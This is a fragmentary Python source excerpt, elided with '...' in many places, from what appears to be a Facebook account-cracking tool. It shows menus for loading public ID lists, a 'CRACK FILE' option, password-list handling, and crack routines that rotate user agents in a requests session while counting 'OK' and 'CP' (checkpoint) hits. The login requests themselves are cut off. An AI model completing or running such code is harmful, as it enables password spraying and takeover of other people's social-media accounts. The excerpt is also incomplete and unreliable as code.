...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	print('        \n    [\033[1;97m\033[1;41m  LOGIN....DAXK BOY  \033[0m\033[1;93m]\n')
	...
	print('%s[%s3%s]%s CRACK FILE %s[%sON%s]'%(P,H,P,H,P,H,P))	
...
def public():
	try:
		...
		exit()
	try:
		jum = int(input('[+] >> CAHND ID DADANIT  : '))
	except ValueError:
		time.sleep(3)
		print('{k}[✘] ID KAN PUBLIC NIN ')
		follower()
	if jum<1:
...
def setting():
	...
	print('______________________________________________________\n')
	print('[✔][1] MOBILE FACEBOOK [TP LINK,FTTS,GORAN NET')
...
def passwrd():
	...
	print("\x1b[1;37m  AIRPLANE ✈️ DAGRSINA")
	print(" \x1b[1;37m WASTAN DN CTRL + Z STOP TOOL")
	os.system('echo -e "═════════════════════════════════════════════════════════"')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}[TEROR]{P}[{k}{loop}{P}/{h}{len(id)}{P}]-{P}[{H}OK - {ok}{P}]-{P}[{k}CP - {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[TERO]{P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}--{ok}-{P}]—{P}[{k}--{cp}-{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
